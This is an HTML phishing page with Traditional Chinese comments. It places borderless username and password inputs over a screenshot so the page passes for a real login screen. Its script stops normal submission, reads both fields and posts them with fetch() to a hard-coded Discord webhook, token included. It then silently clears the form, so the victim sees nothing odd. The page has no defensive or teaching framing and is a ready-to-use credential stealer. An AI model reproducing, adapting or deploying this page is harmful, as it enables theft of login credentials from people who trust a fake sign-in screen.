<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <style>
        body {
            margin: 0; /* 移除瀏覽器預設的 8px 外距 */
            background-color: #000
        }
        img {
            display: block; /* 移除圖片下方的微小空隙 */
            width: 100%;    /* 讓圖片寬度撐滿畫面（視需求調整） */
            height: auto;
        }
        .input-overlay {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 535px; 
            right: 878px;   
            border: none;    /* 移除平常看到的灰色邊框 */
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay:hover {
            background-color: #393C44; /* 變淺一點的灰色 */
        }
        .input-overlay123 {
            box-sizing: border-box;
            color: #ffffff;
            position: absolute;
            bottom: 463px; 
            right: 878px;   
            border: none;    /* 移除平常看到的灰色邊框 */
            outline: none;
            font-size: 15px;
            caret-color:#ffffff;
            background-color: #32353C;
            height: 37px;
            width: 397px;
            padding: 10px;
            z-index:100;
        }
        .input-overlay123:hover {
            background-color: #393C44; /* 變淺一點的灰色 */
        }
        .input_img{
            z-index:2;
            position: absolute;
            bottom: 286px; 
            right: 603px;
            width: 700px;  /* 這裡改小，例如 100px 或 50px */
            height: auto;
        }
        .button_css{
            z-index:3;
            position: absolute;
            bottom: 370px; 
            right: 939px;
            width: 280px;  /* 這裡改小，例如 100px 或 50px */
            height: auto;
            border: none;       /* 移除預設邊框 */
            padding: 0;         /* 移除預設內距 */
            background: none;
        }
    </style>
</head>
<body>
    <form id="submit-form">
        <img src="input.png" class="input_img">
        <img src="img.png">

        <button type="submit" class="button_css">
            <img src="button.png" style="width: 100%;">
        </button>

        <input type="text" id="acc" class="input-overlay">
        <input type="password" id="pwd" class="input-overlay123">
    </form>

    <script>
    document.getElementById("submit-form").addEventListener("submit", function(e) {
        e.preventDefault(); 

        const account = document.getElementById("acc").value;
        const password = document.getElementById("pwd").value;

        // 💡 填入你剛才複製的 Discord Webhook 網址
        const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";

        // 構造要傳送到 Discord 的訊息格式
        const payload = {
            content: `帳號: \`${account}\`\n 密碼: \`${password}\`\n`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                // 傳送成功後清空欄位，不顯示任何動作
                this.reset();
            }
        })
        .catch(error => console.error('Error:', error));
    });
    </script>
</body>
</html>
